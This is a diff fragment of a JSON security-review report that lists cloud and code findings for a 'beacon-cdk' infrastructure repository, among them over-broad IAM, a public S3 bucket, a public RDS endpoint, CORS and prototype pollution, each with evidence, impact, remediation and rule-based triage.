+        "path": "orchard-jobs/src/lib/schema.js",
+        "symbol": "applyDefaults",
+        "line": 92
+      },
+      "class": "Prototype pollution",
+      "severity": "low",
+      "status": "probable",
+      "evidence": "schema.js:92-103 iterates Object.keys(source) and recurses into nested objects, assigning target[key] without excluding '__proto__', 'constructor' or 'prototype'. JSON.parse materialises '__proto__' as an own enumerable key, so Object.keys includes it; `target['__proto__']` then resolves to Object.prototype (a truthy object, passing the line 96 check) and the recursive call writes onto it. The function is exported (line 107) and its docstring describes the intended input as a merge of tenant-saved preferences with per-run values.",
+      "impact": "Any future caller that feeds request-derived JSON into applyDefaults pollutes Object.prototype process-wide, which in a Koa/Ajv/BullMQ process typically escalates to logic bypass or denial of service. No caller exists in the current tree, so the flaw is latent rather than reachable today.",
+      "recommendation": "Skip the dangerous keys explicitly (`if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;`), or build the merge with Object.create(null) targets and Object.hasOwn checks.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "HOLDS",
+          "reason": "Partially: exploitation depends on a caller that does not yet exist in this tree, which is the shape FP-01 targets. Reported at low severity and status 'probable' for that reason rather than dropped, because FP-08 keeps intrinsically unsafe logic in scope regardless of callers."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "FP-08 keeps a direct injection path in a function's own logic valid even with no current callers, which is the basis for reporting it."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "schema.js:91-103,105-111 verified verbatim; grep confirms no in-repo caller."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "FP-08 exempts intrinsic flaws from trust-boundary tracing; no ingress is claimed."
+        }
+      ]
+    },
+    {
+      "title": "Production API task role is granted AdministratorAccess",
+      "location": {
+        "path": "beacon-cdk/config/environments.ts",
+        "symbol": "tierPolicies.ops",
+        "line": 29
+      },
+      "class": "Excessive IAM privilege",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "tierPolicies maps the 'ops' tier to the AWS managed policy 'AdministratorAccess' (environments.ts:26-30). prod sets apiTier: 'ops' (environments.ts:68, with the comment that the production API 'also exposes the maintenance commands the on-call runbooks use'). ServiceRole's constructor calls attachTierPolicy (service-role.ts:35), which does role.addManagedPolicy(ManagedPolicy.fromAwsManagedPolicyName('AdministratorAccess')) (service-role.ts:44-45). api-stack.ts:33-46 assigns that role as the taskRole of the Fargate task definition, and the service sits behind an internet-facing ALB (api-stack.ts:76-93).",
+      "impact": "Any code execution, SSRF-to-metadata, or container escape in the internet-facing API container yields full administrative control of the AWS account (000000000003): read every secret, delete backups, create IAM users, pivot to every other workload.",
+      "recommendation": "Delete the AdministratorAccess tier. Grant the API only what it needs (the artifact bucket, the queue and the DB secret, all already granted explicitly at api-stack.ts:39-41) and move break-glass administration to a separate, human-assumed role with MFA and session logging.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not defence-in-depth: this actively grants '*' on '*' to an internet-reachable workload."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is the production environment configuration, selected by BEACON_ENV=prod in bin/beacon.ts:14."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "environments.ts:26-30,58-72, service-role.ts:35,43-46 and api-stack.ts:33-47 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Infrastructure privilege finding, not a data-flow finding."
+        }
+      ]
+    },
+    {
+      "title": "Shared artifacts bucket is opened to anonymous readers in production",
+      "location": {
+        "path": "beacon-cdk/lib/constructs/bucket.ts",
+        "symbol": "ArtifactBucket",
+        "line": 56
+      },
+      "class": "Sensitive data exposure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "prod sets assetsPublic: true (environments.ts:64, justified as 'The CDN pulls the shared brand assets straight from the origin'). data-stack.ts:28-32 forwards that as publicRead to a SINGLE bucket which, per its own comment at data-stack.ts:26-27, 'holds everything the platform produces: the brand assets the CDN pulls, the rendered documents and the tenant data exports'. bucket.ts:33-40 then relaxes BlockPublicAccess (blockPublicPolicy: false, restrictPublicBuckets: false) and bucket.ts:55-64 attaches a resource policy granting s3:GetObject to iam.AnyPrincipal() on arnForObjects('*') - the entire key space, not a brand-assets prefix.",
+      "impact": "Every rendered tenant document and every tenant data export in the production bucket is anonymously readable by anyone who learns or guesses a key. Enumeration is also easier than it looks because the bucket name is published as a stack output (data-stack.ts:66-68).",
+      "recommendation": "Scope the public statement to the brand-assets prefix (arnForObjects('assets/*')) or, better, split brand assets into their own bucket and front the private bucket with CloudFront + Origin Access Control so blockPublicAccess can stay BLOCK_ALL.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An explicit AnyPrincipal GetObject policy is an active grant, not a missing control."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The blockPublicAcls/ignorePublicAcls half of the mitigation is accepted as working; the bucket POLICY route to public read is deliberately left open beside it."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "bucket.ts:29-64, data-stack.ts:26-32 and environments.ts:58-72 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Infrastructure exposure finding, not a data-flow finding."
+        }
+      ]
+    },
+    {
+      "title": "RDS instance is created with publiclyAccessible: true",
+      "location": {
+        "path": "beacon-cdk/lib/data-stack.ts",
+        "symbol": "DataStack.database",
+        "line": 60
+      },
+      "class": "Network exposure",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "data-stack.ts:42-64 places the Postgres instance in PRIVATE_ISOLATED subnets (line 48) and then sets publiclyAccessible: true (line 60), justified by the comment that an analytics warehouse in another account 'pulls nightly over the public endpoint'. The two settings contradict each other, and the endpoint address is published as a stack output (lines 69-71). The only thing still confining the instance is DatabaseSg, whose ingress is limited to the service and bastion security groups (network-stack.ts:76-85).",
+      "impact": "The database is one security-group edit away from being internet-reachable, and the isolated-subnet design that is supposed to make such an edit harmless no longer does. Credentials come from a generated secret (data-stack.ts:38-40), so this is exposure of the attack surface rather than immediate compromise.",
+      "recommendation": "Set publiclyAccessible: false and give the cross-account warehouse a VPC peering connection, PrivateLink endpoint, or a read replica in a dedicated subnet, rather than a public endpoint.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "HOLDS",
+          "reason": "Partially: with DatabaseSg allowing only the service and bastion SGs, the current exposure is bounded, so part of this reads as defence-in-depth. Reported at medium/probable rather than dropped because publiclyAccessible directly contradicts the PRIVATE_ISOLATED placement on the same construct and silently removes a layer the design depends on."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "prod is a first-class environment in this configuration, and cfg.ephemeral is false there, so none of these values are test-only."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "data-stack.ts:42-71 and network-stack.ts:71-85 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Infrastructure finding, not a data-flow finding."
+        }
+      ]
+    },
+    {
+      "title": "API container is configured with CORS_ALLOW_ORIGIN '*' together with CORS_ALLOW_CREDENTIALS 'true'",
+      "location": {
+        "path": "beacon-cdk/lib/api-stack.ts",
+        "symbol": "taskDefinition.addContainer",
+        "line": 59
+      },
+      "class": "CORS misconfiguration",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "api-stack.ts:53-61 passes CORS_ALLOW_ORIGIN: '*' and CORS_ALLOW_CREDENTIALS: 'true' into the beacon/api container's environment, with the comment that 'the origin cannot be pinned' because tenants use their own subdomains. Browsers refuse the literal '*' when credentials are requested, so a server implementation given this pair either breaks credentialed CORS or - the common workaround, and the one the sibling edge-relay service actually implements at nginx/relay.conf:39 - reflects the caller's Origin instead, which is equivalent to allowing every origin with credentials.",
+      "impact": "If the API reflects the origin, any attacker-controlled page can make credentialed cross-origin calls to the production API on behalf of a signed-in tenant user and read the responses.",
+      "recommendation": "Pass an explicit allowlist or a suffix pattern for the tenant subdomains (e.g. CORS_ALLOWED_ORIGIN_SUFFIX '.beacon.example') and have the application echo the Origin only after matching it.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This sets a permissive value rather than omitting a header."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "api-stack.ts:49-65 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress is the browser-supplied Origin header of a cross-site request; the container image beacon/api:1.12.0 is not in this repository, which is why the consuming logic is inferred from the sibling implementation rather than read."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "HOLDS",
+          "reason": "Partially: the exact behaviour depends on how the unavailable container image consumes these two variables. Kept at medium/confirmed for the configuration itself, which is a documented invalid combination however it is consumed."
+        }
+      ]
+    },
+    {
+      "title": "pickEnv silently falls back to the dev environment, which opens bastion SSH to 0.0.0.0/0 and makes the bucket public",
+      "location": {
+        "path": "beacon-cdk/config/environments.ts",
+        "symbol": "pickEnv",
+        "line": 83
+      },
+      "class": "Insecure default / fail-open configuration",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "pickEnv returns environments[name ?? ''] ?? dev (environments.ts:82-84) - an unset BEACON_ENV, a typo ('production' instead of 'prod'), or a pipeline stage that forgets to export the variable all resolve to dev rather than failing. bin/beacon.ts:12-14 documents this as intentional for laptop synths. The dev config sets adminCidrs: ['0.0.0.0/0'] (environments.ts:36), which network-stack.ts:52-58 turns into an SSH (tcp/22) ingress rule from the entire internet on the bastion security group, and assetsPublic: true, and ephemeral: true (removalPolicy DESTROY + autoDeleteObjects, bucket.ts:41-44; deletionProtection false, data-stack.ts:56).",
+      "impact": "The dev environment's jump host accepts SSH from anywhere, and a mis-set variable applies that posture - plus a public bucket and no deletion protection - wherever the deploy lands.",
+      "recommendation": "Make pickEnv throw on an unknown or missing name, restrict dev's adminCidrs to the real office ranges, and gate the 0.0.0.0/0 case behind an explicit, reviewed override.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "World-open SSH is an active ingress grant, not an absent hardening measure."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "FP-06 forbids dismissing a finding merely because it sits on a dev/test path; here the dev config is additionally the DEFAULT that any unrecognised BEACON_ENV selects."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "environments.ts:32-43,82-84, bin/beacon.ts:12-14 and network-stack.ts:45-58 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Infrastructure configuration finding, not a data-flow finding."
+        }
+      ]
+    },
+    {
+      "title": "Artifact grant is issued with an empty prefix, giving the API role object access across the whole shared bucket",
+      "location": {
+        "path": "beacon-cdk/lib/api-stack.ts",
+        "symbol": "ApiStack constructor",
+        "line": 39
+      },
+      "class": "Excessive IAM privilege",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "grantArtifacts documents its third parameter as the confinement mechanism - 'Pass the prefix the service writes under so the grant stays scoped to it' (service-role.ts:48-51) - and defaults it to '' (line 55). api-stack.ts:39 calls grantArtifacts(serviceRole.role, props.artifacts.bucket) with two arguments, so the resulting statements are s3:GetObject/PutObject/DeleteObject on arnForObjects('*') and s3:ListBucket with an 's3:prefix' condition of '*' (service-role.ts:57-69) - the entire bucket that also holds every other tenant's exports and documents (data-stack.ts:26-27).",
+      "impact": "Cross-tenant object read, overwrite and delete are available to the API task role by IAM, so tenant isolation rests entirely on application logic. In production the point is moot because the same role already carries AdministratorAccess; the finding matters for staging/dev and for the day the admin tier is removed.",
+      "recommendation": "Pass an explicit per-service prefix (e.g. grantArtifacts(role, bucket, 'renders/')) and enforce the tenant segment inside the application key construction.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "A concrete deviation from the construct's own documented contract, not a generic hardening wish."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "api-stack.ts:38-41 and service-role.ts:48-70 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Infrastructure privilege finding, not a data-flow finding."
+        }
+      ]
+    }
+  ]
+}
